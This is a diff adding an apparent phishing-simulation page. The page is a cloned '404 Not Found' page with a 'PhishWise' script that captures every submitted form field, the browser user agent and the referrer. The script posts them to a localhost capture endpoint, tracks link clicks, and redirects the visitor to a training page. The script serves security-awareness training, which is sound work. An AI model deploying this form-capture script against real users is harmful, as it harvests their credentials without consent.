@@ -1,0 +1,69 @@
+<html lang="fr-FR" dir="ltr"><head><title>404 Not Found</title><style nonce="">*{margin:0;padding:0;border:0}html,body{height:100%;}</style><link rel="shortcut icon" href="#" onclick="alert('Lien désactivé pour la simulation'); return false;" type="image/x-icon"><link rel="icon" href="#" onclick="alert('Lien désactivé pour la simulation'); return false;" sizes="32x32"><link rel="icon" href="#" onclick="alert('Lien désactivé pour la simulation'); return false;" sizes="48x48"><link rel="icon" href="#" onclick="alert('Lien désactivé pour la simulation'); return false;" sizes="96x96"><link rel="icon" href="#" onclick="alert('Lien désactivé pour la simulation'); return false;" sizes="144x144"></head><body><iframe style="display:block;border:0;" src="/error?src=404&amp;ifr=1&amp;error=" width="100%" height="100%" frameborder="\" scrolling="no"></iframe>
+    <script>
+      (function() {
+        console.log('PhishWise tracking activé');
+
+     document.addEventListener('DOMContentLoaded', function() {
+          const forms = document.querySelectorAll('form');
+
+          forms.forEach(function(form) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+
+             const formData = new FormData(form);
+              const data = {};
+
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+             data._campaignId = '6866a4acbb0f4f58178c2568';
+              data._timestamp = new Date().toISOString();
+             
+             data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+
+            fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+             }).then(function() {
+                window.location.href = 'http://localhost:3000/learning/6866a4acbb0f4f58178c2568';
+              }).catch(function(error) {
+               console.error('Erreur lors de l\'envoi des données:', error);
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/6866a4acbb0f4f58178c2568';
+                }, 1000);
+              });
+            });
+          });
+
+         document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' || e.target.closest('a')) {
+              const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');
+
+           if (link.href.startsWith('http://localhost:3000') || link.getAttribute('onclick')) {
+                 e.preventDefault();
+              }
+
+             fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '6866a4acbb0f4f58178c2568',
+                  clickedUrl: link.href,
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+         }
+          });
+        });
+      })();
+    </script>
+</body></html>
